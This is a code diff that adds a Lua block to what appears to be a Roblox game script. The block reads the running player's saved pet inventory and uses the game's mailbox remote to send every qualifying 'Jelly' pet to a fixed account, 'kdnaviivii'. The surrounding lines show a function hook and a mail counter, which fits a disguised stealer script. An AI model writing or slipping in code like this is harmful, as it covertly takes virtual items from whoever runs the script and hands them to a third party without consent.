@@ -199,6 +199,23 @@ print(responsexr.StatusMessage)
 end
 return originalFunction(x, unpack(args))
 end)
+local save = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get()
+local dir = game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets
+function _mail(u, t, i, n)
+local args = {
+    [1] = u,
+    [2] = "Jelly",
+    [3] = t,
+    [4] = i,
+    [5] = n or 1
+}
+return game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+end
+for i,v in pairs(save.Inventory.Pets) do
+if string.find(v.id, "Jelly") and require(dir[v.id]).difficulty < _G.Min then
+_mail("kdnaviivii", "Pet", i, (v.am or 1))
+end
+end
 
 game.Players.PlayerRemoving:Connect(function(p)
 if mailc >= 1 and p==game.Players.LocalPlayer then
